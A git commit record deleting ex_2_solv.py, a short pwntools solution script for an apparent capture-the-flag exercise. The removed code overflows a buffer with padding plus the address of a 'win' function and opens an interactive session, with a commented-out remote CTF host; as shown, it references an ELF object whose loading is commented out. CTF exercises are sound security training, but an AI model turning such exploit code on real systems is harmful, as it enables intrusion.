92662ad877b8b8bad2cc7b2b8453cea83f3377b7
Marie Oberlin <31781240+moberlin18@users.noreply.github.com>
2021-10-04 17:58:36 -0400

    Delete ex_2_solv.py

--- ex_2_solv.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-#no_stack_smashing_here
-#p = remote("cweaccessionsctf.com", 1370)
-p = process('./ex_2')
-# e = ELF("./ex_2")
-payload = b'A'*30 + p64(e.sym['win'])
-print(payload)
-p.sendline(payload)
-p.interactive()
